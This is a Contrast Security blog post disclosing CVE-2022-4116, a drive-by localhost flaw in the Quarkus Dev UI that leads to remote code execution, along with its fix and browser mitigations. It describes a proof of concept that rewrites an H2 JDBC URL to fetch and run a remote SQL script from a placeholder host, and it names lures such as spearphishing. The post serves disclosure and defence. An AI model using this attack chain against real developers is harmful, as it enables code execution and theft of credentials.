---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-11-23_contrast-discovers-zero-day-flaw-in-popular-quarkus-java-framework.md
original_filename: 2022-11-23_contrast-discovers-zero-day-flaw-in-popular-quarkus-java-framework.md
title: Contrast discovers zero-day flaw in popular Quarkus Java framework
category: documents
detected_topics:
- cors
- csrf
- sso
- command-injection
- otp
- automation-abuse
tags:
- imported
- documents
- cors
- csrf
- sso
- command-injection
- otp
- automation-abuse
language: en
raw_sha256: 03cc35a5624047c974493f5bcf6c599e6fedd1314f8385d33330eebe3e5609b1
text_sha256: d2dc70c7c372a2b4863f06efd077ab00bfa5d97c71e6f054702960ced54b13c6
ingested_at: '2026-06-28T07:32:16Z'
sensitivity: unknown
redactions_applied: false
---

# Contrast discovers zero-day flaw in popular Quarkus Java framework

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-11-23_contrast-discovers-zero-day-flaw-in-popular-quarkus-java-framework.md
- Source Type: markdown
- Detected Topics: cors, csrf, sso, command-injection, otp, automation-abuse
- Ingested At: 2026-06-28T07:32:16Z
- Redactions Applied: False
- Raw SHA256: `03cc35a5624047c974493f5bcf6c599e6fedd1314f8385d33330eebe3e5609b1`
- Text SHA256: `d2dc70c7c372a2b4863f06efd077ab00bfa5d97c71e6f054702960ced54b13c6`


## Content

---
title: "Contrast discovers zero-day flaw in popular Quarkus Java framework"
page_title: "Localhost attack against Quarkus developers | Contrast Security"
url: "https://www.contrastsecurity.com/security-influencers/localhost-attack-against-quarkus-developers-contrast-security"
final_url: "https://www.contrastsecurity.com/security-influencers/localhost-attack-against-quarkus-developers-contrast-security"
authors: ["Joseph Beeton"]
programs: ["Quarkus"]
bugs: ["Drive-by attack", "CSRF", "RCE"]
publication_date: "2022-11-23"
added_date: "2022-12-12"
source: "pentester.land/writeups.json"
original_index: 1866
---

[ ![Contrast Security Logo](/hubfs/contrast-web-platform--2025/images/logos/contrast-logo--full-color.png) ](https://www.contrastsecurity.com)

  * Login
  * [Contrast customer](https://app.contrastsecurity.com/Contrast/static/ng/index.html#/pages/signin)
  * [Contrast partner](https://contrastsecurity.allbound.com/)
  * [Contact us](https://www.contrastsecurity.com/contact-us)
  * _![](https://www.contrastsecurity.com/hubfs/contrast-web-platform--2025/images/icons/icon--search__med-gray.svg)_

  * Products

### Contrast runtime security platform

The next evolution in application security

[Explore the platform](/platform)

  * [ ![Contrast Application Detection and Response \(ADR\)](https://www.contrastsecurity.com/hubfs/Project%20Horizon/ADR_navicon.png) Contrast ADR Detect and respond to attacks ](https://www.contrastsecurity.com/contrast-adr)
  * [ ![Contrast Application and API Security Testing \(AST\)](https://www.contrastsecurity.com/hubfs/Project%20Horizon/AST_navicon.png) Contrast AST Find and fix vulnerabilities ](https://www.contrastsecurity.com/contrast-ast)
  * [Assess](https://www.contrastsecurity.com/contrast-assess)
  * [SCA](https://www.contrastsecurity.com/contrast-sca)
  * [Scan](https://www.contrastsecurity.com/contrast-scan)
  * [ ![Contrast One navigation logo](https://www.contrastsecurity.com/hubfs/contrast-web-platform--2025/images/logos/contrast-logo--min-green-and-black.svg) Contrast One Managed runtime security ](https://www.contrastsecurity.com/contrast-one)

  * [Pricing and packaging](https://www.contrastsecurity.com/pricing-and-packaging)
  * [Integrations](https://www.contrastsecurity.com/integration)
  * [Languages and frameworks](https://www.contrastsecurity.com/languages-and-frameworks)
  * [Moving beyond RASP](https://www.contrastsecurity.com/beyond-rasp-security-application-detection-response-adr)

  * Solutions

### By solution

  * [ Vulnerability risk prioritization ](https://www.contrastsecurity.com/vulnerability-risk-prioritization)
  * [ Detection and response ](https://www.contrastsecurity.com/detection-and-response)
  * [ Cyber resilience ](https://www.contrastsecurity.com/cyber-resilience)
  * [ Compliance and governance ](https://www.contrastsecurity.com/compliance-and-governance)
  * [ API security ](https://www.contrastsecurity.com/api-security)
  * [ Application Security Posture Management (ASPM) ](https://www.contrastsecurity.com/vulnerability-prioritization-and-aspm-strategy)

### By team

  * [ SecOps ](https://www.contrastsecurity.com/secops-experience)
  * [ AppSec ](https://www.contrastsecurity.com/appsec-experience)
  * [ Developer ](https://www.contrastsecurity.com/developer-experience)
  * [ CISO ](https://www.contrastsecurity.com/ciso-experience)

### By industry

  * [ Technology ](https://www.contrastsecurity.com/contrast-technology-industry)
  * [ Financial services ](https://www.contrastsecurity.com/contrast-financial-services)
  * [ Healthcare ](https://www.contrastsecurity.com/contrast-healthcare-industry)
  * [ Insurance ](https://www.contrastsecurity.com/contrast-insurance-industry)

  * [Partner](/partners)

### Partner program overview

Innovating together with proven success

[Partner program overview](/partners)

  * [ Channel partners ](https://www.contrastsecurity.com/channel-partners)
  * [ GSI and service providers ](https://www.contrastsecurity.com/partners/gsi-and-service-providers)
  * [ Technology partners ](https://www.contrastsecurity.com/technology-partners)

  * [Become a partner](https://www.contrastsecurity.com/become-a-partner)
  * [Find a partner](https://www.contrastsecurity.com/partner-directory)
  * [Visit partner portal](https://contrastsecurity.allbound.com/)

### Gartner® Report: Mythos Changed the Conversation. Fix Your Vulnerability Management for Good.

[Get the report](https://www.contrastsecurity.com/gartner-report-mythos-changed-the-conversation)

  * [Customers](https://www.contrastsecurity.com/customer-success)
  * Company

  * [ About us ](https://www.contrastsecurity.com/about-us)
  * [ Leadership team ](https://www.contrastsecurity.com/about/management-team)
  * [ Press releases ](https://www.contrastsecurity.com/press-releases)

  * [ ![Careers Icon](https://www.contrastsecurity.com/hubfs/Contrast_Security/icons/mega_menu/culture-and-careers.svg) Careers ](https://www.contrastsecurity.com/contrast-careers)
  * [ ![Contact Icon](https://www.contrastsecurity.com/hubfs/Contrast_Security/icons/mega_menu/contact-us.svg) Contact us ](https://www.contrastsecurity.com/contact-us)

### Threat Report: Software Under Siege 2025

[Get report](https://www.contrastsecurity.com/software-under-siege-2025-report)

  * Resources

### Resource center

Analyst reports, eBooks, on-demand webinars, white papers and more.

[Visit resource center](/resources)

### Support and services

  * [ Documentation ](https://docs.contrastsecurity.com/)
  * [ Product release notes ](https://docs.contrastsecurity.com/en/release.html)
  * [ Blog ](https://www.contrastsecurity.com/security-influencers)

### Education

  * [ Events ](https://www.contrastsecurity.com/upcoming-events)
  * [ Glossary ](https://www.contrastsecurity.com/glossary)
  * [ OWASP Top 10 ](//www.contrastsecurity.com/owasp-top-ten)
  * [ Mythos AI Exploits ](https://www.contrastsecurity.com/mythos-ai-exploit-runtime-protection)

### A DevSecOps buyer’s guide for application security

[Get the guide](https://www.contrastsecurity.com/a-devsecops-buyers-guide-for-modern-application-security)

[Try Contrast](https://www.contrastsecurity.com/try-contrast-security)

X

[Back to blog](/security-influencers)

# Contrast discovers zero-day flaw in popular Quarkus Java framework

By [Joseph Beeton, Senior Application Security Researcher, Contrast Security](https://www.contrastsecurity.com/security-influencers/author/joseph-beeton-senior-application-security-researcher-contrast-security)

November 29, 2022

While preparing [a talk](https://deepsec.net/speaker.html#PSLOT579) for the recent [DeepSec Conference](https://deepsec.net/) about attacking the developer environment through drive-by localhost, I reviewed some popular Java frameworks to see if they were vulnerable.

They were. 

During my research, I had discovered a high-severity zero day in the Red Hat build of [Quarkus](https://www.redhat.com/en/topics/cloud-native-apps/what-is-quarkus) — a popular, full-stack, Kubernetes-native Java framework optimized for Java virtual machines (JVMs) and native compilation that’s used as a platform for serverless, cloud and [Kubernetes](https://support.contrastsecurity.com/hc/en-us/articles/360054034352-Kubernetes-and-Contrast) environments. 

I was hoping it would be announced in time for the talk, but it was a week too late. Given that Red Hat published details of the vulnerability — [CVE-2022-4116](https://access.redhat.com/security/cve/CVE-2022-4116) — on Monday, Nov. 21, I can now share details of the vulnerability, which is a dangerous one. 

At this point, the vulnerability has been rated 9.8 on the CVSS v3 Base Score. The vulnerability is found in the Dev UI Config Editor, which is vulnerable to drive-by localhost attacks that could lead to [remote-code execution (RCE)](https://en.wikipedia.org/wiki/Arbitrary_code_execution). Exploiting the vulnerability isn’t difficult and can be done by a malicious actor without any privileges. 

According to Red Hat’s preliminary findings, the vulnerability affects the quarkus_dev_ui package. To be clear, CVE-2022-4116 doesn't impact services running in production; it only impacts developers building services using Quarkus. If a developer running Quarkus locally visits a website with malicious JavaScript, that JavaScript can silently execute code on the developer’s machine. 

The payload I created — see [here](https://github.com/JoeBeeton/simple-request-attacks/tree/main/webserver/public-html/quarkus-liquibase-h2.html) and [here](https://github.com/JoeBeeton/simple-request-attacks/blob/main/webserver/public-html/exec.sql) on GitHub — just opens the system calculator. However, the potential exists for the silent code to take more damaging actions such as installing a keylogger on the local machine to capture login information to production systems, or using GitHub tokens to modify source code. 

The above HTML is hosted on [joebeeton.github.io](https://joebeeton.github.io/) along with example vulnerable codebases.

## The nature of the beast

As I explained in my [DeepSec talk](https://deepsec.net/speaker.html#PSLOT579), there is a widespread belief that services that are only bound to localhost are not accessible from the outside world. Because of this misplaced belief, developers, for the sake of convenience, will run services they are developing that are configured in a less secure way compared with how they would (hopefully!) do it.

### Simple requests

Normally, when JavaScript is running in the browser and loaded from a domain — e.g., example.com — the JavaScript would not be able to make requests to other domains, including localhost, without a preflight request. The preflight request is used to check the server’s Cross-Origin Resource Sharing (CORS) settings, to see if the server allows requests from example.com. (A CORS preflight request uses specific methods and headers to check whether the CORS protocol is understood and a server is aware.)

However, there are certain types of requests, called Simple Requests, that do not require a preflight request. According to [Mozilla](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS), such requests have to be either GET, HEAD or POST Requests. 

Also, the request can only have a Content type of:

  * application/x-www-form-urlencoded,
  * multipart/form-data,
  * text/plain, or
  * No content type.

No data, including status code, is returned to the calling JavaScript.

That last point is critical. For a Simple Request, the browser makes the request, receives the response, but that data — including the HTTP Status Code — is not returned to JavaScript. It is possible, however, to infer whether the request was successful based on how long it took to return.

Within those constraints, it is possible to access localhost and, in certain circumstances, to trigger arbitrary code execution. 

## Repercussions

By compromising websites used by developers — for example, by simply injecting JavaScript into advertisements served on those sites or by launching a phishing attack that gets the developer to open a web browser on a compromised page — it is possible to reach out via non pre-flighted http requests to those services bound to localhost. It can be done by exploiting common misconfigurations in the Spring framework — a framework that provides a comprehensive programming and configuration model for modern Java-based enterprise applications. Alternatively, it can be done by exploiting known vulnerabilities found by myself and others. In fact, it is possible to generate an RCE on the developer's machine or on other services on their private network.

As developers have write access to codebases, AWS keys, server creds, etc., access to the developer's machine gives an attacker a great deal of scope to pivot to other resources on the network, as well as to modify or to flat-out steal the codebase.

We’re not sure how extensively the Red Hat build of Quarkus is used. Having been started only in 2019, the Quarkus framework is still young, and the Spring Boot framework is said to be far more popular. 

But it’s worth noting that Quarkus is [reportedly](https://maddevs.io/blog/spring-boot-vs-quarkus/) getting more popular, particularly in Kubernetes use cases, given its ease of use and significantly lighter demand on hardware resources to run and to run applications. 

Still, it’s probably safe to assume that the use of Quarkus isn’t extensive, considering that it’s focused on Kubernetes usage. While many developers use Kubernetes, not all are using Quarkus. Therefore, the number of developers affected by this drive-by localhost attack is probably small. 

## Developer mode

During the development process of a Quarkus application, a developer would normally run the service being developed on their own machine. Quarkus has a nice feature, called Developer Mode, to help. 

I started by using:

gradle quarkusDev

mvn quarkus:dev

This allows background compilation and live reload as the developer modifies the application, as well as the ability to modify configuration settings via a Web UI. 

Dev UI

The Dev UI allows for live modification of the application’s configuration.

![](https://lh5.googleusercontent.com/74c9sIpONpHJy86BWtOG0X6auuYSypeIugtjgiWRkZuxcr81VDdK7BHKvwdWySlLiScISdarJyLflNtl0gxVlbtGJcHTxUy_T7SXSmbVhwDF_OmJzojN7IDFjieGdoObTzs_n-BHQi2UD07nbyzlTV86YIH71lbCbT36qLFuCJQK3Oyo2IuviuF9egLDFA)

Changes to this UI modify the application.properties within the project and trigger a live reload of the application.

The Dev UI is designed to only be used during the development process of the application and only bound to localhost. Because of this, there is no authentication or other security controls built into it, such as a Cross-Site Request Forgery (CSRF) token.

Properties in the Dev UI are modified using a POST request with content type of application/x-www-form-urlencoded. ![](https://lh6.googleusercontent.com/rtO-_pN6TrwrkmD4ABTAtush1NU7famRsicwb8KpQ4LN_oFVAKnrX3karyHvE2VfiitJN4HggGRwb374CVDRWM_UHpfiKF8OoWyI6OLSZawTn2KpRrs8OVOUypK36SuSSFHUbzpZlA5P-VDmgeHW6e2XeqwmAWalbxVjtVfNeiKOPWuyzeBVxsQv7AiQVA)

Making the POST request modifies the property and reloads the application. Also, as it’s a POST request with a content type of application/x-www-form-urlencoded, it is a simple request.

## Proof-of-concept 

As the Dev UI can be modified via a Simple Request, it is possible for JavaScript loaded from other websites to edit the Dev UI. While an attacker can make a website containing JavaScript that can edit the configuration of a Quarkus application in Developer mode, there are two questions: 

  * How can developers get access to the site with malicious JavaScript? 
  * What is the impact of modifying Quarkus properties?

### Getting developers to access the malicious website

This attack requires getting someone who is running Quarkus in developer mode to go to a website containing the malicious JavaScript, as the JavaScript can be executed on page load, by continually attempting to hit localhost or both. It just requires that Quarkus is running in developer mode at the same point the browser tab is open. No other interaction is required for this vulnerability to be exploited. Even if the exploit fails, there is no easy way to see an indication that the attack occurred. Only if the person were to look at the browser’s developer console would they see errors or network traffic to localhost that looked suspicious.

Some ways that attackers could lure Quarkus users might include:

#### Tutorial website

One way to get people using Quarkus to visit your website would be to build a tutorial website for Quarkus. Some of those reading would be following along with the tutorial and would either already have Quarkus running or would start it up as they go through the tutorial.

#### Spearphishing

It would be possible to target a specific developer or a group of developers working in the same organization. If it is known that the targeted developers are using Quarkus, an attack could be executed by sending that person or group an email with a link to a website. If they happen to be running Quarkus in developer mode, compromising them would merely entail getting them to click the link; the page containing malicious JavaScript will then be loaded, and they would be compromised. 

## Impact of modifying properties

If an attacker is able to modify the properties of a Quarkus application, they’re capable of creating an RCE vulnerability on the target system. There are likely several ways of doing this. Once an adversary is able to modify the properties of an application, escalating to RCE is almost a certainty. 

The easiest way I’ve found to craft such an attack is based on [work done](https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database/) by security researcher and white-hat hacker Eugene Lim. 

The proof of concept (POC): 

Index.html

![](https://lh4.googleusercontent.com/120O7ufaQ0-WAFby4mvHh_5D_CCStaKUhNpVW-IEIVTJ4S0ZyoYyTcWCRdzFIGxVxKacBjLBKKjpEaQGyuzAFTX9kF8X9psx3koNKok725ys5epRRLF3upZJ59AIuU-NS4tpRyduFDxxQyEJVsMKd9OzWnWl5ghGA2JqojMWBot15KIIzGxN5b5KDBU7eg)

Exec.sql

![](https://lh5.googleusercontent.com/u3R1_TZ72wXF8Ey40YwHW2dBOBwlDWQOfl0XvD6MNlr9f5LKOSJwXp6SrWthxPgTKEmX-gq_GA62py8YRxjG9RhOd3rOG7tQBV9rYDnBOBuxMY6GJc5hKF4x1Jkj3D3PiY2MJre8C0Ri2Yv526Y_3ICmKIMlwJFBqqbZ6UZvSG7WRTMR12u1c_28TrScnQ)

The above POC does the following.

  1. On page load, executes JavaScript that makes a POST request to localhost.
  2. The POST request modifies the JDBC URL of this application.
  3. That modification changes the H2 database to have an argument of INIT=runscript from ‘’<http://somerandomsite.bla/exec.sql>.”
  4. As the Quarkus application is reloaded, the H2 database is rebuilt, and the in-memory H2 database pulls down the exec.sql script and executes it.
  5. The exec.sql contains an ALIAS command to compile a Java method that runs whatever command is passed in.
  6. The next line in the SQL script calls that method with the argument open /System/Applications/Calculator.app, thus opening the calculator app on the target’s machine.

![](https://lh6.googleusercontent.com/P1-J7tsQw0BndUEzdRyZizxMAHz7dus0u0RS-UvQTJPScOD3BOKuUWoWprPMTkQWSqo1tVDt6E526ynFWWIKgViSjSHXrv7SM0xINCgpsIpwPWqYlm7t9TK9GpktZk7s85B-qN2CVVETgOSpCEsMe8wfzuqoefMC7-RAu6cqVjGUcdHnH7YYc2iA5oLKPQ)

## The fix

The fix implemented by the Quarkus team for [CVE-2022-4116](https://access.redhat.com/security/cve/CVE-2022-4116) — which is in versions 2.14.2.Final and 2.13.5.Final (LTS) — requires the Dev UI to check the origin header so that it only accepts requests that contain a header of:

origin : localhost

This header is set by the browser itself and is not modifiable by JavaScript run in the browser. JavaScript loaded from the website example.com would have an origin header of: 

origin : example.com

## Drive-by localhost attacks as an attack vector against developers

The underlying issue here is that the Quarkus team assumed that, since the service was designed to only be run on a developer’s local machine and bound to localhost, it would be safe from attacks originating on the internet. Therefore, they did not add any security controls. However, this class of attack vector is not limited to Quarkus. I have found similar issues in other web services that are normally left open when bound to localhost. There are likely to be many more.

Attack payloads for Quarkus and other frameworks can be found [here](https://joebeeton.github.io/). 

## An attack vector with a limited shelf life

While CVE-2022-4116 has been fixed, there are likely many more equivalent vulnerabilities in other frameworks. Luckily, there is a solution on the horizon that should block this attack vector without finding and fixing each vulnerable framework: W3C’s new [Private Network Access](https://wicg.github.io/private-network-access/) specification. 

This specification splits the hosts into three areas:

  * Public internet
  * Private network
  * Localhost

When a request is made in the browser from a less private network to a more private one, even Simple Requests trigger a preflight.

Also, a new CORS header is added to the preflight request of:

Access-Control-Request-Private-Network 

The server will need to respond with a header of:

Access-Control-Allow-Private-Network : true

… for the browser to then allow the actual POST/GET etc. request through.

If the server does not respond with the above header set to true, the request is blocked. For this class of attack to work with this specification, the server would have to specifically opt in to allow requests that originate from less private networks. This effectively blocks this attack vector for those browsers that support it.

### Browser support for Private Network Access

Currently, only the team behind the Chromium/Chrome browser is actively working on implementing the new specification, which is currently scheduled for [Chrome 109](https://developer.chrome.com/blog/private-network-access-update/https://developer.chrome.com/blog/private-network-access-update/), due to be released mid-December 2022.

Firefox has Private Network Access [on its backlog](https://bugzilla.mozilla.org/show_bug.cgi?id=1481298), but a release date has not yet been scheduled. I’ve not been able to find information on Safari or Edge. Given that Edge is Chromium-based, the browser may get Private Network Access at some point as the change in Chromium feeds into Edge.

## A note to Contrast users

The Contrast Platform does not use Quarkus. We advise that developers who use the affected Red Hat build of [Quarkus](https://www.redhat.com/en/topics/cloud-native-apps/what-is-quarkus) update to the fixed version as soon as possible.

![Joseph Beeton, Senior Application Security Researcher, Contrast Security](https://www.contrastsecurity.com/hubfs/Joe_Beeton.jpg)

#### Joseph Beeton, Senior Application Security Researcher, Contrast Security

Joseph Beeton is a Senior Security Researcher for Contrast Security and a recovering Java Developer. He started his career as a Java developer writing archive/backup software before moving to a large financial company working on web applications and backend APIs. However, after a while, writing yet another microservice isn't that much fun anymore. Breaking them was, though. Thus, he moved to Application Security and from there on to Research.

[ Previous Cybersecurity Insights with Contrast CISO David Lindner | 11/25 ](/security-influencers/cybersecurity-insights-with-contrast-ciso-david-lindner-11/25)

[ Next 7 AppSec predictions for 2023 ](/security-influencers/application-security-appsec-predictions-contrast-security)

### Loving our content? Subscribe now!

Get the latest content from Contrast directly to your mailbox. By subscribing, you will stay up to date with all the latest and greatest from Contrast.

### 

Product

  * [Contrast Runtime Security Platform](/platform)
  * [Contrast Application Detection and Response (ADR)](https://www.contrastsecurity.com/contrast-adr)
  * [Contrast Application and API Security Testing (AST)](https://www.contrastsecurity.com/contrast-ast)
  * [Contrast One ™](https://www.contrastsecurity.com/contrast-one)
  * [Contrast Assess (IAST)](https://www.contrastsecurity.com/contrast-assess)
  * [Contrast Software Composition Analysis (SCA)](https://www.contrastsecurity.com/contrast-sca)
  * [Contrast Scan (SAST)](https://www.contrastsecurity.com/contrast-scan)

Solutions

  * [Vulnerability risk prioritization](https://www.contrastsecurity.com/vulnerability-risk-prioritization)
  * [Detection and response](https://www.contrastsecurity.com/detection-and-response)
  * [Cyber resilience](https://www.contrastsecurity.com/cyber-resilience)
  * [Compliance and governance](https://www.contrastsecurity.com/compliance-and-governance)
  * [API security](https://www.contrastsecurity.com/api-security)
  * [Application Security Posture Management (ASPM)](https://www.contrastsecurity.com/vulnerability-prioritization-and-aspm-strategy)

By team

  * [SecOps](https://www.contrastsecurity.com/secops-experience)
  * [AppSec](https://www.contrastsecurity.com/appsec-experience)
  * [Developer](https://www.contrastsecurity.com/developer-experience)
  * [CISO](https://www.contrastsecurity.com/ciso-experience)

By industry

  * [Technology](https://www.contrastsecurity.com/contrast-technology-industry)
  * [Financial services](https://www.contrastsecurity.com/contrast-financial-services)
  * [Healthcare](https://www.contrastsecurity.com/contrast-healthcare-industry)
  * [Insurance](https://www.contrastsecurity.com/contrast-insurance-industry)

Partner

  * [Partner program overview](https://www.contrastsecurity.com/partners)
  * [Channel partners](https://www.contrastsecurity.com/channel-partners)
  * [GSI and service providers](https://www.contrastsecurity.com/partners/gsi-and-service-providers)
  * [Technology partners](https://www.contrastsecurity.com/technology-partners)
  * [Become a partner](https://www.contrastsecurity.com/become-a-partner)
  * [Find a partner](https://www.contrastsecurity.com/partner-directory)
  * [Visit partner portal](https://contrastsecurity.allbound.com/)

Company

  * [About us](https://www.contrastsecurity.com/about-us)
  * [Leadership team](https://www.contrastsecurity.com/about/management-team)
  * [Press releases](https://www.contrastsecurity.com/press-releases)
  * [Careers](https://www.contrastsecurity.com/contrast-careers)
  * [Contact us](https://www.contrastsecurity.com/contact-us)

Resources

  * [Resource center](https://contrastsecurity.com/resources)
  * [Documentation](https://docs.contrastsecurity.com/)
  * [Product Release Notes](https://docs.contrastsecurity.com/en/release.html)
  * [Blog](https://www.contrastsecurity.com/security-influencers)
  * [Events](https://www.contrastsecurity.com/upcoming-events)
  * [Glossary](https://www.contrastsecurity.com/glossary)
  * [OWASP Top 10](https://www.contrastsecurity.com/owasp-top-ten)
  * [Mythos AI Exploits](https://www.contrastsecurity.com/mythos-ai-exploit-runtime-protection)

©Contrast Security 2026

  * [Privacy Matters](https://www.contrastsecurity.com/privacy-matters)
  * [Terms of Service](https://www.contrastsecurity.com/end-user-terms-of-service)

  * [![LinkedIn](https://www.contrastsecurity.com/hubfs/contrast-web-platform--2025/images/icons/icon-linkedin--white.svg)](https://www.linkedin.com/company/contrast-security)
  * [![Youtube](https://www.contrastsecurity.com/hubfs/contrast-web-platform--2025/images/icons/icon-youtube--white.svg)](https://www.youtube.com/c/contrastsecurity)

![Contrast Logo](https://www.contrastsecurity.com/hubfs/contrast-web-platform--2025/images/logos/contrast-logo-full--inline-white-green.svg)

[![Share on LinkedIn](https://www.contrastsecurity.com/hubfs/contrast-web-platform--2025/images/icons/social-icon--linkedin__black.svg)](http://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.contrastsecurity.com%2Fsecurity-influencers%2Flocalhost-attack-against-quarkus-developers-contrast-security%3Futm_medium%3Dsocial%26utm_source%3Dlinkedin) [![Share on Twitter](https://www.contrastsecurity.com/hubfs/contrast-web-platform--2025/images/icons/social-icon--x__black.svg)](https://twitter.com/intent/tweet?original_referer=https%3A%2F%2Fwww.contrastsecurity.com%2Fsecurity-influencers%2Flocalhost-attack-against-quarkus-developers-contrast-security%3Futm_medium%3Dsocial%26utm_source%3Dtwitter&url=https%3A%2F%2Fwww.contrastsecurity.com%2Fsecurity-influencers%2Flocalhost-attack-against-quarkus-developers-contrast-security%3Futm_medium%3Dsocial%26utm_source%3Dtwitter&source=tweetbutton&text=Localhost%20attack%20against%20Quarkus%20developers%20%7C%20Contrast%20Security) [![Share on Email](https://www.contrastsecurity.com/hubfs/contrast-web-platform--2025/images/icons/social-icon--envelope__black.svg)](mailto:?subject=Check%20out%20https%3A%2F%2Fwww.contrastsecurity.com%2Fsecurity-influencers%2Flocalhost-attack-against-quarkus-developers-contrast-security%3Futm_medium%3Dsocial%26utm_source%3Demail%20&body=Check%20out%20https%3A%2F%2Fwww.contrastsecurity.com%2Fsecurity-influencers%2Flocalhost-attack-against-quarkus-developers-contrast-security%3Futm_medium%3Dsocial%26utm_source%3Demail)

![Enlarged Image]() Close
